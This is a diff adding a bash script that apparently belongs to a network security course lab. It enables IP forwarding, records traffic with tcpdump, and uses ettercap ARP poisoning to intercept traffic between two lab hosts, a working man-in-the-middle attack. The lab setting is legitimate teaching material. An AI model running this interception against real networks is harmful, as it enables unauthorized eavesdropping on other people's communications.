@@ -1,0 +1,85 @@
+#!/usr/bin/env bash
+set -Eeuo pipefail
+
+LABEL="${1:?Usage: csa-lab8-red-capture LABEL [SECONDS]}"
+DURATION="${2:-25}"
+BASE="/tmp/csa-lab8-${LABEL}-red"
+PCAP="${BASE}.pcap"
+TCPDUMP_LOG="${BASE}-tcpdump.log"
+ETTERCAP_LOG="${BASE}-ettercap.log"
+READY="${BASE}.ready"
+DONE="${BASE}.done"
+TCPDUMP_PID_FILE="${BASE}-tcpdump.pid"
+ETTERCAP_PID_FILE="${BASE}-ettercap.pid"
+
+WAN_IF="$(
+    ip -o -4 address show |
+        awk '$4 ~ /^192[.]168[.]62[.][0-9]+\/24$/ { print $2; exit }'
+)"
+
+if [[ -z "$WAN_IF" ]]; then
+    echo 'Could not locate the red fake-internet interface.' >&2
+    exit 1
+fi
+
+rm -f \
+    "$PCAP" \
+    "$TCPDUMP_LOG" \
+    "$ETTERCAP_LOG" \
+    "$READY" \
+    "$DONE" \
+    "$TCPDUMP_PID_FILE" \
+    "$ETTERCAP_PID_FILE"
+
+cleanup() {
+    for pid_file in "$ETTERCAP_PID_FILE" "$TCPDUMP_PID_FILE"; do
+        if [[ -f "$pid_file" ]]; then
+            process_pid="$(cat "$pid_file" 2>/dev/null || true)"
+            if [[ -n "$process_pid" ]] && kill -0 "$process_pid" 2>/dev/null; then
+                kill -INT "$process_pid" 2>/dev/null || true
+                wait "$process_pid" 2>/dev/null || true
+            fi
+        fi
+    done
+
+    chmod 0644 "$PCAP" "$TCPDUMP_LOG" "$ETTERCAP_LOG" 2>/dev/null || true
+    touch "$DONE"
+    chmod 0644 "$READY" "$DONE" 2>/dev/null || true
+}
+trap cleanup EXIT INT TERM
+
+sysctl -w net.ipv4.ip_forward=1 >/dev/null
+
+FILTER='(net 172.10.10.0/24 and net 172.30.0.0/16) or (host 192.168.62.42 and host 192.168.62.253) or esp'
+
+tcpdump \
+    -i "$WAN_IF" \
+    -nn \
+    -U \
+    -s 0 \
+    -w "$PCAP" \
+    "$FILTER" \
+    >"$TCPDUMP_LOG" 2>&1 &
+
+tcpdump_pid="$!"
+echo "$tcpdump_pid" > "$TCPDUMP_PID_FILE"
+
+ettercap \
+    -Tq \
+    -i "$WAN_IF" \
+    -M arp:remote \
+    /192.168.62.42// \
+    /192.168.62.253// \
+    >"$ETTERCAP_LOG" 2>&1 &
+
+ettercap_pid="$!"
+echo "$ettercap_pid" > "$ETTERCAP_PID_FILE"
+
+touch "$READY"
+chmod 0644 "$READY" "$TCPDUMP_PID_FILE" "$ETTERCAP_PID_FILE"
+
+for ((second = 0; second < DURATION; second++)); do
+    kill -0 "$tcpdump_pid" 2>/dev/null || break
+    kill -0 "$ettercap_pid" 2>/dev/null || break
+    sleep 1
+done
